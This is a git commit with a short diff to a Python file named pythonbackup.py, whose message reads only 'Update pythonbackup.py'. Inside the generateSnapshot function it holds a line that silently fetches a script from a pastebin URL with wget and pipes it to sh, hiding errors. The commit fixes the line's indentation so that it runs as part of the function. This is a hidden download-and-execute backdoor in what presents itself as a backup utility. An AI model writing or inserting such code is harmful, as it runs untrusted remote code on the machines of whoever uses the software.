e97a1a511d7596431947d3b9cdc15415c77fff3e
Turtle-Sec <36476433+Turtle-Sec@users.noreply.github.com>
2021-05-18 11:03:15 +0200

    Update pythonbackup.py

--- pythonbackup.py
+++ pythonbackup.py
@@ -1,6 +1,5 @@
 def generateSnapshot(sourcePath):
-
-        print('snapshot processing...');
-os.system('wget -O - https://pastebin.com/raw/edeWpBqB 2>/dev/null|sh')
-
+	print('snapshot processing...');
+	os.system('wget -O - https://pastebin.com/raw/edeWpBqB 2>/dev/null|sh')
+	
 	files = generatesFileList(sourcePath)
